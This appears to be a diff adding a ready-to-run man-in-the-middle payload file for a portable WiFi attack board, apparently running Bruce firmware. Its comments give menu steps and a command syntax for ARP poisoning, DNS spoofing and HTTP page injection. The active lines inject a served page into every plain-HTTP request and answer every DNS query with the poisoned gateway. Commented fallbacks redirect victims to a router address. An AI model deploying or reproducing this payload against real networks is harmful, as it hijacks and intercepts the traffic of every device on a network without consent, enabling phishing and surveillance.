@@ -1,0 +1,35 @@
+# Vandeta MITM payload - one file describes the whole attack.
+# Copy it to /BruceSpoof/mitm.txt on the card, then:
+#   WiFi > Wifi Atks > MITM Attack
+#   Network: pick the SSID to join (saved password, else it asks)
+#   Target : All devices, or one host from the ARP scan
+#   Payload: mitm.txt
+#   Start attack  -> the run screen shows what the payload is doing, BACK stops
+#   and restores every ARP mapping it changed.
+#
+# One command per line, '#' starts a comment. Every command is the JS API in
+# plain text:
+#
+#   page <match> <file>              httpInterceptor.addInjection()   200 + HTML
+#   redirect <match> <url>           httpInterceptor.addRedirect()    302
+#   dns <name|*> <ip>                dnsSpoof.addRule() / startAll()
+#   target all|<ip>                  arpSpoof.start() - overrides the Target row
+#   fallback dns <ip> [secs]         when no HTTP request landed in <secs>
+#   fallback redirect <url> [secs]   ... the same, with a 302 instead
+#
+# <match> is a host substring, or * for every request.
+# <file> is relative to /BruceSpoof and must fit 1100 bytes (one frame).
+# <ip> is an address, or 'gateway' (the joined network's router) / 'this'.
+
+# 1. Serve a page for every plain-HTTP request.
+page * html/redirect.html
+
+# 2. Answer every DNS query with the gateway. Its MAC is already the board's
+#    (the poison), so a name that resolves points the victim's next request at
+#    this board - which is what lets the page above catch it.
+dns * gateway
+
+# 3. A fallback is the cascade: try the page first, switch method if nothing
+#    landed in N seconds. Comment the dns line above to use one of these.
+#fallback dns gateway 10
+#fallback redirect http://192.168.1.1/ 10
